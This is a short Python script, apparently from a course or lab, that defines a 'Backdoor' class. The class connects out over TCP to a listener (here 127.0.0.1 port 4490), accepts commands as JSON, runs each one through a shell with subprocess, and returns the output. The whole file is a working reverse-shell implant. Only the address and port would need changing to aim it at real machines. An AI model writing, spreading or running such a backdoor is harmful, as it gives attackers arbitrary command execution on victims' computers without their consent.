
import socket, subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(json.dumps("\n[+] Connection Established.\n").encode())

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:    
                json_data = json_data + self.connection.recv(1460)
                return json.loads(json_data)
            except ValueError:
                continue

    def close_connection(self):
        self.connection.close()

    def run(self):
        while True:
            try:
                #received_command = self.connection.recv(1024)
                received_command = self.reliable_receive()
                #print(received_command)
                command_result = self.execute_system_command(received_command).decode()
                #print(command_result)
                #self.connection.send(command_result)
                self.reliable_send(command_result)

            except ConnectionResetError:
                pass
            
            except json.JSONDecodeError:
                #print(received_command)
                pass
    
            except KeyboardInterrupt:
                print("[+] Detected CTRL + C.....Closing App....Please wait...")
                self.connection.close()
                exit()

#class end

my_backdoor = Backdoor("127.0.0.1", 4490)
my_backdoor.run()
my_backdoor.close_connection()